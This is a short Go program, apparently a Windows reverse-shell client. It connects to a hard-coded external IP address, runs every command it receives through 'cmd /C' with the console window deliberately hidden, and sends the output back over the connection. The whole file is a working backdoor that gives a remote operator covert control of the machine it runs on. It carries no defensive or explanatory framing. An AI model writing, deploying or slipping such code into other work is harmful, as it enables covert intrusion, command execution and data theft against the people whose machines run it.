package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall" // 导入 syscall 包
)

func main() {
	conn, err := net.Dial("tcp", "101.200.236.51:8080")
	if err != nil {
		fmt.Println("连接服务器失败:", err)
		return
	}
	defer conn.Close()

	reader := bufio.NewReader(conn)

	for {
		commandStr, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("读取服务器命令失败:", err)
			break
		}
		commandStr = strings.TrimSpace(commandStr)
		if commandStr == "" {
			continue
		}
		fmt.Println("接收到命令:", commandStr)

		if strings.HasPrefix(commandStr, "cd ") {
			dir := strings.TrimSpace(commandStr[3:])
			err := os.Chdir(dir)
			var result string
			if err != nil {
				result = fmt.Sprintf("切换目录失败: %v\n", err)
			} else {
				result = fmt.Sprintf("切换到目录: %s\n", dir)
			}
			_, err = conn.Write([]byte(result + "===END===\n"))
			if err != nil {
				fmt.Println("发送结果失败:", err)
				break
			}
			continue
		}

		cmd := exec.Command("cmd", "/C", commandStr)
		// 关键：隐藏窗口
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

		output, err := cmd.CombinedOutput()

		var result string
		if err != nil {
			result = fmt.Sprintf("命令执行出错: %v\n输出:\n%s", err, output)
		} else {
			result = string(output)
		}

		_, err = conn.Write([]byte(result + "\n===END===\n"))
		if err != nil {
			fmt.Println("发送结果失败:", err)
			break
		}
	}
}
